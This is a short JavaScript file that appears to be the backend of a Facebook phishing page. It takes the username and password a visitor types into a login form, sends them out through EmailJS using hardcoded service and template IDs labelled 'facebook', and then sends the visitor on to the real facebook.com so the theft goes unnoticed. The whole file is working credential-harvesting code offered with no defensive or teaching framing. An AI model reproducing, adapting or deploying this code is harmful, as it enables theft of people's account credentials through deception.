const servicerID= "service_6a19hus"
const tempID="template_xma6tyt"
let params = {
    username:"username",
    password:"password"
  }
function sendmail(){
    if(document.getElementsByClassName("username")[0].value==="" ||document.getElementsByClassName("password")[0].value===""){
      if(document.getElementsByClassName("username")[0].value===""){
        document.getElementsByClassName("username")[0].classList.add("erro")
        console.log("empty");
      }
      if(document.getElementsByClassName("password")[0].value===""){
        document.getElementsByClassName("password")[0].classList.add("erro")
      }
    }else{
        params={
            nameOfMethode:"facebook",
            username:document.getElementsByClassName("username")[0].value,
            password:document.getElementsByClassName("password")[0].value
        }
        emailjs.send(servicerID,tempID,params).then(
            function (res){
                 console.log(res);
                window.location.href="https://www.facebook.com/"
            }
            )
        }
}